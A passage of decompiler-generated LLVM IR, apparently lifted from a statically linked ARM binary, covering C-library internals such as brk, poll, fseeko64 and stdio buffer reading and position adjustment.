  store i32 %arg1, i32* @r4, align 4
  %v0_15f20 = call i32 @__libc_getpid()
  store i32 %v3_15f18, i32* @r4, align 4
  %v0_15f2c = call i32 @kill()
  ret i32 %v0_15f2c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 0, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15f30 = add i32 %arg1, 28
  %v2_15f30 = inttoptr i32 %v1_15f30 to i32*
  %v3_15f30 = load i32, i32* %v2_15f30, align 4
  %v1_15f38 = add i32 %arg1, 44
  %v2_15f38 = inttoptr i32 %v1_15f38 to i32*
  %v3_15f38 = load i32, i32* %v2_15f38, align 4
  store i32 %v3_15f30, i32* @global_var_29878.629, align 4
  store i32 %v3_15f38, i32* @global_var_2987c.631, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_15f5c = call i32 @brk(i32* %arg1)
  %v3_15f60 = icmp ult i32 %v2_15f5c, %tmp
  store i32 %v2_15f5c, i32* @global_var_297a8.560, align 4
  br i1 %v3_15f60, label %dec_label_pc_15f74, label %dec_label_pc_15f84

dec_label_pc_15f74:                               ; preds = %entry
  %v0_15f74 = call i32 @__errno_location()
  %v2_15f7c = inttoptr i32 %v0_15f74 to i32*
  store i32 12, i32* %v2_15f7c, align 4
  br label %dec_label_pc_15f84

dec_label_pc_15f84:                               ; preds = %entry, %dec_label_pc_15f74
  %v0_15f84 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_15f74 ]
  ret i32 %v0_15f84

; uselistorder directives
  uselistorder i32* @global_var_297a8.560, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15f84, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15f90 = load i32, i32* @r4, align 4
  store i32 %v3_15f90, i32* %stack_var_-8, align 4
  %v5_15f94 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_15f94, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15f94, -4095
  br i1 %tmp, label %dec_label_pc_15fb4, label %dec_label_pc_15fa4

dec_label_pc_15fa4:                               ; preds = %entry
  %v0_15fa4 = call i32 @__errno_location()
  %v0_15fa8 = load i32, i32* %r4.global-to-local, align 4
  %v1_15fa8 = sub i32 0, %v0_15fa8
  %v2_15fac = inttoptr i32 %v0_15fa4 to i32*
  store i32 %v1_15fa8, i32* %v2_15fac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15fb4

dec_label_pc_15fb4:                               ; preds = %entry, %dec_label_pc_15fa4
  %v0_15fb4 = phi i32 [ %v5_15f94, %entry ], [ -1, %dec_label_pc_15fa4 ]
  %v2_15fb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15fb8, i32* @r4, align 4
  ret i32 %v0_15fb4

; uselistorder directives
  uselistorder i32 %v5_15f94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15fb4, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_15fbc = load i32, i32* @r2, align 4
  store i32 %v0_15fbc, i32* @r3, align 4
  %v0_15fc4 = call i32 @__GI_fseeko64()
  ret i32 %v0_15fc4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_15fc8 = load i32, i32* @r4, align 4
  %v6_15fc8 = load i32, i32* @r5, align 4
  %v9_15fc8 = load i32, i32* @r6, align 4
  %v0_15fcc = load i32, i32* @r3, align 4
  %v2_15fd0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_15fcc, i32* @r6, align 4
  %v0_15fd8 = load i32, i32* @r0, align 4
  store i32 %v0_15fd8, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_15fcc, 3
  br i1 %tmp, label %dec_label_pc_15ff4, label %dec_label_pc_15fe0

dec_label_pc_15fe0:                               ; preds = %entry
  %v0_15fe0 = call i32 @__errno_location()
  store i32 %v0_15fe0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_15fec = inttoptr i32 %v0_15fe0 to i32*
  store i32 22, i32* %v2_15fec, align 4
  br label %.thread3

dec_label_pc_15ff4:                               ; preds = %entry
  %v1_15ff4 = add i32 %v0_15fd8, 52
  %v2_15ff4 = inttoptr i32 %v1_15ff4 to i32*
  %v3_15ff4 = load i32, i32* %v2_15ff4, align 4
  store i32 %v3_15ff4, i32* %r7.global-to-local, align 4
  %v2_15ff8 = icmp eq i32 %v3_15ff4, 0
  %v0_15ffc = load i32, i32* @r1, align 4
  store i32 %v0_15ffc, i32* %stack_var_-28, align 4
  br i1 %v2_15ff8, label %dec_label_pc_16008, label %dec_label_pc_16034

dec_label_pc_16008:                               ; preds = %dec_label_pc_15ff4
  %v1_16008 = add i32 %v0_15fd8, 56
  store i32 %v1_16008, i32* @r4, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  store i32 %v2_15fd0, i32* @r0, align 4
  store i32 %v1_16008, i32* %r2.global-to-local, align 4
  %v1_16020 = call i32 @__pthread_return_void()
  %v0_16024 = load i32, i32* @r4, align 4
  store i32 %v0_16024, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  store i32 90164, i32* @lr, align 4
  %v1_16030 = call i32 @__pthread_return_0()
  store i32 %v1_16030, i32* %r0.global-to-local, align 4
  %v0_16034.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16034

dec_label_pc_16034:                               ; preds = %dec_label_pc_15ff4, %dec_label_pc_16008
  %v0_16040 = phi i32 [ %v0_15fd8, %dec_label_pc_15ff4 ], [ %v0_16034.pre, %dec_label_pc_16008 ]
  %v1_16034 = inttoptr i32 %v0_16040 to i8*
  %v2_16034 = load i8, i8* %v1_16034, align 1
  %v3_16034 = zext i8 %v2_16034 to i32
  store i32 %v3_16034, i32* %r3.global-to-local, align 4
  %v1_16038 = and i32 %v3_16034, 64
  %v2_16038 = icmp eq i32 %v1_16038, 0
  br i1 %v2_16038, label %dec_label_pc_16050, label %dec_label_pc_16040

dec_label_pc_16040:                               ; preds = %dec_label_pc_16034
  store i32 %v0_16040, i32* @r0, align 4
  %v0_16044 = call i32 @__stdio_wcommit()
  store i32 %v0_16044, i32* %r0.global-to-local, align 4
  %v2_16048 = icmp eq i32 %v0_16044, 0
  br i1 %v2_16048, label %dec_label_pc_16050, label %dec_label_pc_160c0

dec_label_pc_16050:                               ; preds = %dec_label_pc_16040, %dec_label_pc_16034
  %v0_16050 = load i32, i32* @r6, align 4
  %v7_16050 = icmp eq i32 %v0_16050, 1
  br i1 %v7_16050, label %dec_label_pc_16058, label %dec_label_pc_16050.dec_label_pc_1606c_crit_edge

dec_label_pc_16050.dec_label_pc_1606c_crit_edge:  ; preds = %dec_label_pc_16050
  br label %dec_label_pc_1606c

dec_label_pc_16058:                               ; preds = %dec_label_pc_16050
  %v0_16058 = load i32, i32* @r5, align 4
  store i32 %v0_16058, i32* %r0.global-to-local, align 4
  %v2_1605c = ptrtoint i32* %stack_var_-28 to i32
  %v2_16060 = inttoptr i32 %v0_16058 to i8*
  %v3_16060 = call i32 @__stdio_adjust_position(i8* %v2_16060, i32 %v2_1605c)
  store i32 %v3_16060, i32* %r0.global-to-local, align 4
  %v1_16064 = icmp slt i32 %v3_16060, 0
  br i1 %v1_16064, label %dec_label_pc_160c0, label %dec_label_pc_16058.dec_label_pc_1606c_crit_edge

dec_label_pc_16058.dec_label_pc_1606c_crit_edge:  ; preds = %dec_label_pc_16058
  %v0_1606c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1606c

dec_label_pc_1606c:                               ; preds = %dec_label_pc_16050.dec_label_pc_1606c_crit_edge, %dec_label_pc_16058.dec_label_pc_1606c_crit_edge
  %v0_1606c = phi i32 [ %v0_16050, %dec_label_pc_16050.dec_label_pc_1606c_crit_edge ], [ %v0_1606c.pre, %dec_label_pc_16058.dec_label_pc_1606c_crit_edge ]
  store i32 %v0_1606c, i32* %r2.global-to-local, align 4
  %v0_16070 = load i32, i32* @r5, align 4
  store i32 %v0_16070, i32* %r0.global-to-local, align 4
  %v4_16078 = call i32 @__stdio_seek(i32 %v0_16070, i32* nonnull %stack_var_-28, i32 %v0_1606c)
  store i32 %v4_16078, i32* %r0.global-to-local, align 4
  %v1_1607c = icmp slt i32 %v4_16078, 0
  br i1 %v1_1607c, label %dec_label_pc_160c0, label %dec_label_pc_16084

dec_label_pc_16084:                               ; preds = %dec_label_pc_1606c
  %v0_16084 = load i32, i32* @r5, align 4
  %v1_16084 = inttoptr i32 %v0_16084 to i32*
  %v2_16084 = load i32, i32* %v1_16084, align 4
  store i32 %v2_16084, i32* %r3.global-to-local, align 4
  %v1_16088 = add i32 %v0_16084, 8
  %v2_16088 = inttoptr i32 %v1_16088 to i32*
  %v3_16088 = load i32, i32* %v2_16088, align 4
  store i32 %v3_16088, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16090 = and i32 %v2_16084, -72
  store i32 %v1_16090, i32* %r3.global-to-local, align 4
  %v3_16094 = sdiv i32 %v2_16084, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1609c = trunc i32 %v3_16094 to i8
  %v3_1609c = add i32 %v0_16084, 1
  %v4_1609c = inttoptr i32 %v3_1609c to i8*
  store i8 %v1_1609c, i8* %v4_1609c, align 1
  %v0_160a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_160a0 = load i32, i32* @r5, align 4
  %v2_160a0 = add i32 %v1_160a0, 28
  %v3_160a0 = inttoptr i32 %v2_160a0 to i32*
  store i32 %v0_160a0, i32* %v3_160a0, align 4
  %v0_160a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_160a4 = trunc i32 %v0_160a4 to i8
  %v2_160a4 = load i32, i32* @r5, align 4
  %v3_160a4 = add i32 %v2_160a4, 2
  %v4_160a4 = inttoptr i32 %v3_160a4 to i8*
  store i8 %v1_160a4, i8* %v4_160a4, align 1
  %v0_160a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_160a8 = trunc i32 %v0_160a8 to i8
  %v2_160a8 = load i32, i32* @r5, align 4
  %v3_160a8 = inttoptr i32 %v2_160a8 to i8*
  store i8 %v1_160a8, i8* %v3_160a8, align 1
  %v0_160ac = load i32, i32* %r2.global-to-local, align 4
  %v1_160ac = load i32, i32* @r5, align 4
  %v2_160ac = add i32 %v1_160ac, 16
  %v3_160ac = inttoptr i32 %v2_160ac to i32*
  store i32 %v0_160ac, i32* %v3_160ac, align 4
  %v0_160b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_160b0 = load i32, i32* @r5, align 4
  %v2_160b0 = add i32 %v1_160b0, 20
  %v3_160b0 = inttoptr i32 %v2_160b0 to i32*
  store i32 %v0_160b0, i32* %v3_160b0, align 4
  %v0_160b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_160b4 = load i32, i32* @r5, align 4
  %v2_160b4 = add i32 %v1_160b4, 24
  %v3_160b4 = inttoptr i32 %v2_160b4 to i32*
  store i32 %v0_160b4, i32* %v3_160b4, align 4
  %v0_160b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_160b8 = load i32, i32* @r5, align 4
  %v2_160b8 = add i32 %v1_160b8, 44
  %v3_160b8 = inttoptr i32 %v2_160b8 to i32*
  store i32 %v0_160b8, i32* %v3_160b8, align 4
  br label %dec_label_pc_160c4

dec_label_pc_160c0:                               ; preds = %dec_label_pc_16040, %dec_label_pc_1606c, %dec_label_pc_16058
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_160c4

dec_label_pc_160c4:                               ; preds = %dec_label_pc_16084, %dec_label_pc_160c0
  %v0_160c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_160c4 = icmp eq i32 %v0_160c4, 0
  br i1 %v2_160c4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_160c4
  store i32 %v2_15fd0, i32* %r0.global-to-local, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  store i32 90332, i32* @lr, align 4
  call void @__pseudo_branch(i32 79548)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_160c4, %dec_label_pc_15fe0, %bb
  %v0_160dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_160dc, i32* %r0.global-to-local, align 4
  store i32 %v3_15fc8, i32* @r4, align 4
  store i32 %v6_15fc8, i32* @r5, align 4
  store i32 %v9_15fc8, i32* @r6, align 4
  ret i32 %v0_160dc

; uselistorder directives
  uselistorder i32 %v0_1606c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 8, 7, 11, 9, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 27, 26, 25, 24, 23, 22, 21, 4, 35, 45, 44, 19, 3, 2, 1, 42, 41, 40, 39, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 20, 17, 16, 15, 31, 18, 38, 30, 37, 43, 29, 28, 34, 33, 32 }
  uselistorder i32 ptrtoint (i8* @global_var_136b4.305 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 42, 39, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 1, 0, 41, 40, 48, 47, 46, 45, 9, 8, 11, 10, 6, 5, 4, 3, 2, 32, 31, 30, 7, 44, 29, 43, 28, 27, 26, 25, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 79548, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12 }
  uselistorder i32 22, { 3, 12, 4, 11, 5, 6, 7, 16, 13, 8, 14, 0, 15, 9, 10, 1, 2 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_160c4, { 1, 0 }
  uselistorder label %dec_label_pc_160c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1606c, { 1, 0 }
  uselistorder label %dec_label_pc_16034, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_160f8 = load i32, i32* @r4, align 4
  store i32 %v3_160f8, i32* %stack_var_-12, align 4
  %v3_160fc = load i8, i8* %arg1, align 1
  %v4_160fc = zext i8 %v3_160fc to i32
  store i32 %v4_160fc, i32* %r3.global-to-local, align 4
  %v1_16100 = and i32 %v4_160fc, 4
  store i32 %v1_16100, i32* %r5.global-to-local, align 4
  %v2_16100 = icmp eq i32 %v1_16100, 0
  store i1 %v2_16100, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_16100, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_160f8, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_16110 = icmp slt i32 %arg2, 0
  %v2_16110 = icmp eq i32 %arg2, 0
  store i1 %v2_16110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16110, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_16118 = add i32 %tmp, 4
  %v2_16118 = inttoptr i32 %v1_16118 to i32*
  %v3_16118 = load i32, i32* %v2_16118, align 4
  store i32 %v3_16118, i32* %r0.global-to-local, align 4
  %v1_1611c = call i32 @__libc_read(i32 %v3_16118)
  store i32 %v1_1611c, i32* %r0.global-to-local, align 4
  %v2_16120 = icmp eq i32 %v1_1611c, 0
  store i1 %v2_16120, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_1611c, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_16124 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_16124, i32* @r4, align 4
  ret i32 %v1_1611c

bb13:                                             ; preds = %bb10
  %v0_16128 = load i32, i32* @r4, align 4
  %v1_16128 = inttoptr i32 %v0_16128 to i32*
  %v2_16128 = load i32, i32* %v1_16128, align 4
  %v1_1612c = or i32 %v2_16128, 8
  store i32 %v1_1612c, i32* %r1.global-to-local, align 4
  %v1_16130 = or i32 %v2_16128, 4
  store i32 %v1_16130, i32* %r3.global-to-local, align 4
  %v3_16134 = sdiv i32 %v2_16128, 256
  store i32 %v3_16134, i32* %ip.global-to-local, align 4
  br i1 %v2_16120, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_1613c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1613c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_16140 = trunc i32 %v3_16134 to i8
  %v4_16140 = add i32 %v0_16128, 1
  %v5_16140 = inttoptr i32 %v4_16140 to i8*
  store i8 %v2_16140, i8* %v5_16140, align 1
  %v0_16144.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16144.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_16144 = load i32, i32* %r3.global-to-local, align 4
  %v2_16144 = trunc i32 %v1_16144 to i8
  %v3_16144 = load i32, i32* @r4, align 4
  %v4_16144 = inttoptr i32 %v3_16144 to i8*
  store i8 %v2_16144, i8* %v4_16144, align 1
  %v0_16148.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16148.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_16148 = load i32, i32* %ip.global-to-local, align 4
  %v2_16148 = trunc i32 %v1_16148 to i8
  %v3_16148 = load i32, i32* @r4, align 4
  %v4_16148 = add i32 %v3_16148, 1
  %v5_16148 = inttoptr i32 %v4_16148 to i8*
  store i8 %v2_16148, i8* %v5_16148, align 1
  %v0_1614c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1614c.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_1614c = load i32, i32* %r1.global-to-local, align 4
  %v2_1614c = trunc i32 %v1_1614c to i8
  %v3_1614c = load i32, i32* @r4, align 4
  %v4_1614c = inttoptr i32 %v3_1614c to i8*
  store i8 %v2_1614c, i8* %v4_1614c, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_16150 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16150, i32* @r4, align 4
  %v11_16150 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_16150

; uselistorder directives
  uselistorder i32 %v3_16134, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_16154 = load i32, i32* @r4, align 4
  store i32 %v3_16154, i32* %stack_var_-16, align 4
  %v2_16158 = add i32 %tmp, 1
  %v3_16158 = inttoptr i32 %v2_16158 to i8*
  %v4_16158 = load i8, i8* %v3_16158, align 1
  %v5_16158 = zext i8 %v4_16158 to i32
  %v3_1615c = load i8, i8* %arg1, align 1
  %v4_1615c = zext i8 %v3_1615c to i32
  store i32 %v4_1615c, i32* %r2.global-to-local, align 4
  %v4_16160 = mul nuw nsw i32 %v5_16158, 256
  %v5_16160 = or i32 %v4_1615c, %v4_16160
  store i32 %v5_16160, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1615c, 4
  %v2_16164 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_16164, label %bb, label %dec_label_pc_16174

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_16174:                               ; preds = %entry
  %v1_16164 = zext i8 %tmp15 to i32
  %v1_16174 = add nsw i32 %v1_16164, -1
  %v7_16174 = icmp eq i8 %tmp15, 1
  br i1 %v7_16174, label %.thread, label %dec_label_pc_1617c

dec_label_pc_1617c:                               ; preds = %dec_label_pc_16174
  %v1_1617c = and i32 %v4_16160, 2048
  %v2_1617c = icmp eq i32 %v1_1617c, 0
  br i1 %v2_1617c, label %.thread, label %dec_label_pc_16184

dec_label_pc_16184:                               ; preds = %dec_label_pc_1617c
  %v8_16188 = icmp sgt i32 %v1_16174, 1
  br i1 %v8_16188, label %dec_label_pc_16214, label %dec_label_pc_1618c

dec_label_pc_1618c:                               ; preds = %dec_label_pc_16184
  %v2_1618c = add i32 %tmp, 40
  %v3_1618c = inttoptr i32 %v2_1618c to i32*
  %v4_1618c = load i32, i32* %v3_1618c, align 4
  %v2_16190 = icmp eq i32 %v4_1618c, 0
  br i1 %v2_16190, label %dec_label_pc_16198, label %dec_label_pc_16214

dec_label_pc_16198:                               ; preds = %dec_label_pc_1618c
  %v2_16198 = add i32 %tmp, 3
  %v3_16198 = inttoptr i32 %v2_16198 to i8*
  %v4_16198 = load i8, i8* %v3_16198, align 1
  %v5_16198 = zext i8 %v4_16198 to i32
  %v2_1619c = add i32 %tmp, 44
  %v3_1619c = inttoptr i32 %v2_1619c to i32*
  %v4_1619c = load i32, i32* %v3_1619c, align 4
  store i32 %v4_1619c, i32* %r2.global-to-local, align 4
  %v2_161a0 = sub nsw i32 %v1_16174, %v5_16198
  %v1_161a8 = add nsw i32 %v2_161a0, -1
  %tmp11 = icmp slt i32 %v4_1619c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_16198
  %v7_161ac = add i32 %tmp, 2
  %v8_161ac = inttoptr i32 %v7_161ac to i8*
  %v9_161ac = load i8, i8* %v8_161ac, align 1
  %v10_161ac = zext i8 %v9_161ac to i32
  %v7_161b0 = sub nsw i32 %v1_161a8, %v10_161ac
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16198, %bb, %dec_label_pc_1617c, %dec_label_pc_16174, %bb12
  %v0_161cc = phi i32 [ %v1_16174, %dec_label_pc_1617c ], [ %v1_16174, %dec_label_pc_16174 ], [ 0, %bb ], [ %v7_161b0, %bb12 ], [ %v1_161a8, %dec_label_pc_16198 ]
  %v1_161b4 = and i32 %v4_1615c, 64
  %v2_161b4 = icmp eq i32 %v1_161b4, 0
  %storemerge.in.in.v = select i1 %v2_161b4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_161c0 = add i32 %tmp, 16
  %v3_161c0 = inttoptr i32 %v2_161c0 to i32*
  %v4_161c0 = load i32, i32* %v3_161c0, align 4
  %v2_161c4 = sub i32 %storemerge, %v4_161c0
  %v1_161c8 = inttoptr i32 %arg2 to i32*
  %v2_161c8 = load i32, i32* %v1_161c8, align 4
  store i32 %v2_161c8, i32* %r1.global-to-local, align 4
  %v3_161c8 = add i32 %arg2, 4
  %v4_161c8 = inttoptr i32 %v3_161c8 to i32*
  %v5_161c8 = load i32, i32* %v4_161c8, align 4
  store i32 %v5_161c8, i32* %r2.global-to-local, align 4
  %v2_161cc = add i32 %v2_161c4, %v0_161cc
  store i32 %v2_161cc, i32* %r5.global-to-local, align 4
  %v2_161d0 = sub i32 %v2_161c8, %v2_161cc
  %v2_161d4 = and i32 %v2_161cc, 1073741824
  %v3_161d4 = icmp ne i32 %v2_161d4, 0
  %v6_161d4 = icmp eq i1 %v3_161d4, false
  %tmp16 = icmp slt i32 %v2_161cc, 0
  %v4_161d4.neg = zext i1 %tmp16 to i32
  %v7_161d4 = add i32 %v5_161c8, %v4_161d4.neg
  %v9_161d4 = sext i1 %v6_161d4 to i32
  %v10_161d4 = add i32 %v7_161d4, %v9_161d4
  store i32 %v10_161d4, i32* %r4.global-to-local, align 4
  store i32 %v2_161d0, i32* %v1_161c8, align 4
  %v5_161d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_161d8, i32* %v4_161c8, align 4
  %v0_161dc = load i32, i32* %r6.global-to-local, align 4
  %v1_161dc = add i32 %v0_161dc, 4
  %v2_161dc = inttoptr i32 %v1_161dc to i32*
  %v3_161dc = load i32, i32* %v2_161dc, align 4
  %v1_161e0 = load i32, i32* %r2.global-to-local, align 4
  %v8_161e4 = icmp sgt i32 %v3_161dc, %v1_161e0
  br i1 %v8_161e4, label %dec_label_pc_161f8, label %dec_label_pc_161e8

dec_label_pc_161e8:                               ; preds = %.thread
  %v9_161e0 = icmp eq i32 %v3_161dc, %v1_161e0
  br i1 %v9_161e0, label %dec_label_pc_161ec, label %dec_label_pc_161fcthread-pre-split

dec_label_pc_161ec:                               ; preds = %dec_label_pc_161e8
  %v1_161ec = inttoptr i32 %v0_161dc to i32*
  %v2_161ec = load i32, i32* %v1_161ec, align 4
  %v1_161f0 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_161ec, %v1_161f0
  br i1 %tmp17, label %dec_label_pc_161f8, label %dec_label_pc_161fcthread-pre-split

dec_label_pc_161f8:                               ; preds = %dec_label_pc_161ec, %.thread
  %v0_161f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_161f8 = sub i32 0, %v0_161f8
  store i32 %v1_161f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161fc

dec_label_pc_161fcthread-pre-split:               ; preds = %dec_label_pc_161ec, %dec_label_pc_161e8
  %v0_161fc.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161fc

dec_label_pc_161fc:                               ; preds = %dec_label_pc_161fcthread-pre-split, %dec_label_pc_161f8
  %v0_161fc = phi i32 [ %v0_161fc.pr, %dec_label_pc_161fcthread-pre-split ], [ %v1_161f8, %dec_label_pc_161f8 ]
  %v1_161fc = icmp slt i32 %v0_161fc, 0
  br i1 %v1_161fc, label %dec_label_pc_16204, label %dec_label_pc_16218

dec_label_pc_16204:                               ; preds = %dec_label_pc_161fc
  %v0_16204 = call i32 @__errno_location()
  %v2_1620c = inttoptr i32 %v0_16204 to i32*
  store i32 75, i32* %v2_1620c, align 4
  %v0_16218.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16214:                               ; preds = %dec_label_pc_1618c, %dec_label_pc_16184
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16218:                               ; preds = %dec_label_pc_161fc, %dec_label_pc_16204, %dec_label_pc_16214
  %v0_16218 = phi i32 [ %v0_161fc, %dec_label_pc_161fc ], [ %v0_16218.pre, %dec_label_pc_16204 ], [ -1, %dec_label_pc_16214 ]
  %v2_1621c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1621c, i32* @r4, align 4
  ret i32 %v0_16218

; uselistorder directives
  uselistorder i32 %v1_161e0, { 1, 0 }
  uselistorder i32 %v3_161dc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1615c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16218, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16220 = load i32, i32* @r4, align 4
